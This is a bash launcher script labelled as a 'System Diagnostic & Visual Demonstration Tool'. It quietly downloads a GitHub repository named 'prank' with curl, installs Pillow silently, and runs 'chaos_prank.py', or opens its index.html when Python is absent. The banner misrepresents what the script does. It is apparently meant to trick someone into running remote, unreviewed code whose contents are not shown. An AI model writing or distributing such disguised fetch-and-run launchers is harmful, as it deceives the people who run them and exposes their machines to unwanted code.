#!/usr/bin/env bash
# launch.sh - Seamless launcher for Bash / macOS / Linux / WSL
set -e

echo "======================================================"
echo "   System Diagnostic & Visual Demonstration Tool"
echo "======================================================"
echo

WORK_DIR="${TMPDIR:-/tmp}/prank_app"
mkdir -p "$WORK_DIR"

echo "[*] [1/3] Fetching application package..."
curl -sL https://github.com/pmkaulani/prank/archive/refs/heads/main.zip -o "$WORK_DIR/pkg.zip"
unzip -q -o "$WORK_DIR/pkg.zip" -d "$WORK_DIR"
cd "$WORK_DIR/prank-main"

echo "[*] [2/3] Checking Python runtime..."
if command -v python3 &>/dev/null; then
    PYTHON_BIN="python3"
elif command -v python &>/dev/null; then
    PYTHON_BIN="python"
else
    PYTHON_BIN=""
fi

if [ -n "$PYTHON_BIN" ]; then
    echo "[*] [3/3] Starting application..."
    $PYTHON_BIN -c "import PIL" 2>/dev/null || $PYTHON_BIN -m pip install pillow --quiet || true
    $PYTHON_BIN chaos_prank.py
else
    echo "[!] Python runtime not detected."
    echo "[*] Opening browser interface..."
    if command -v xdg-open &>/dev/null; then
        xdg-open index.html
    elif command -v open &>/dev/null; then
        open index.html
    fi
fi

echo "[*] Execution complete."

